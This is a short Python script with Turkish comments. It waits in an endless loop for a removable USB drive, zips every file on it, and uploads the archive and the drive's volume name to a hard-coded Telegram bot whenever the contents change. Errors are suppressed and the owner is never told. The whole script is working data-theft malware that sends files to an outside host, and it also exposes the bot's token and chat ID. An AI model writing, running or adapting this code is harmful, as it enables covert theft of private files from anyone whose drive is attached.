import os
import zipfile
import subprocess
import json
import time
import requests
import hashlib

token = '7139000080:AAEHzXtT3gUwx0UMNGQ0jtR3_eASKV73Rak'
chat_id = '6268358898'

def start(update, context):
    context.bot.send_message(chat_id=update.effective_chat.id, text="Bot started.")

def calculate_file_hash(file_path):
    hash_algo = hashlib.sha256()
    with open(file_path, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_algo.update(chunk)
    return hash_algo.hexdigest()

def get_volume_name(drive_letter):
    try:
        # WMIC komutunu kullanarak belirli bir sürücü harfi için hacim adını alın
        cmd = f'wmic logicaldisk where "caption=\'{drive_letter}\'" get volumename'
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).decode('utf-8')

        # Çıktıyı işleyin
        lines = output.strip().split('\n')
        if len(lines) > 1 and lines[1].strip():
            return lines[1].strip()
        else:
            return 'No Name'
    except subprocess.CalledProcessError as e:
        print(f"Error executing WMIC command: {e}")
        return None

def scan_and_send(bot_token,chat_id):

    drives = []

    while not drives:
        cmd = 'wmic logicaldisk where "drivetype=2" get caption'
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).decode('utf-8')
        drives = [drive.strip() for drive in output.split()[1:]]

    drive = drives[0]
    volume = get_volume_name(drive)
    if os.path.exists('files.zip'):
        old_hash = calculate_file_hash('files.zip')
    else:
        old_hash = 0

    zip_file_name = "files.zip"
    with zipfile.ZipFile(zip_file_name, "w") as zip_file:
        for folder_name, subfolders, filenames in os.walk(drive):
            for filename in filenames:
                file_path = os.path.join(folder_name, filename)
                zip_file.write(file_path, arcname=os.path.relpath(file_path, drive))

    new_hash = calculate_file_hash('files.zip')

    if old_hash == new_hash:
        return

    message_text = f'**New Log**\nVolume Name: {volume}\nHash: {new_hash}'
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    files = {"document": open(zip_file_name, "rb")}
    data = {
        "chat_id": chat_id,
        "caption": message_text,
        "parse_mode": "Markdown"}

    response = requests.post(url, files=files, data=data)
    
    if response.status_code == 200:
        print("Dosya başarıyla gönderildi.")
    else:
        print("Dosya gönderilirken bir hata oluştu.")
        print(response.text)

while True:
    try:
        scan_and_send(token,chat_id)
    except:
        print('hata')